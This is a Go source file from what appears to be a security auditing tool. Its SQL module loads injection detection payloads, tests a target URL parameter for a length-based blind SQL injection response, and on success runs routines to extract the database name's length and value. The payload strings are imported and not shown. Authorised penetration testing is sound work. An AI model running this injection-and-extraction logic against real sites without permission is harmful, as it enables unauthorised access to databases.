package sql

import (
	"auditor/app"
	"auditor/core/context"
	"auditor/entities"
	"auditor/handlers/common"
	"auditor/payloads/intruder/detect"
	"sync"

	"github.com/fatih/color"
)

const (
	base = "/sql"
)

var (
	options *entities.DBOptions
	wg      = sync.WaitGroup{}
	m       = sync.RWMutex{}
)

// ServiceInterface service interface
type ServiceInterface interface {
	TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error)
	Init(c *context.Context, f *BaseForm) (interface{}, error)
}

// Service  repo
type Service struct {
	rp      RepoInterface
	context *app.Context
}

// NewService new service
func NewService(c *app.Context) ServiceInterface {
	return &Service{
		context: c,
		rp:      NewRepo(),
	}
}

func (s *Service) TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error) {
	payloads := getDetectPayload(SQLIType(f.Type))
	return payloads, nil
}

func (s *Service) Init(c *context.Context, f *BaseForm) (interface{}, error) {
	options = entities.URLOptions(f.URL, f.Param)

	switch validatePwnType() {
	case LengthValidation:
		color.Green("LengthValidation Detection Method: YES")
		pwn(LengthValidation)
	}

	return options, nil
}

func pwn(method SQLiBased) interface{} {
	for k, v := range detect.Payloads {
		if validateByMethod(v, method) == 1 {
			options.Payload = k

			payload := detect.NegativePayloads[k]
			if validateByMethod(payload, method) == 0 {
				color.Yellow("[INFO] PAYLOAD SUCCESSFUL")
				// wg.Add(2)
				// go func() {
				// 	fetchDBName(method)
				// 	wg.Done()
				// }()
				// go func() {
				// 	fetchDBNameLength(method)
				// 	wg.Done()
				// }()

				fetchDBNameLength(method)
				fetchDBName(method)

				// wg.Wait()
				break
			}
		}
	}
	return nil
}
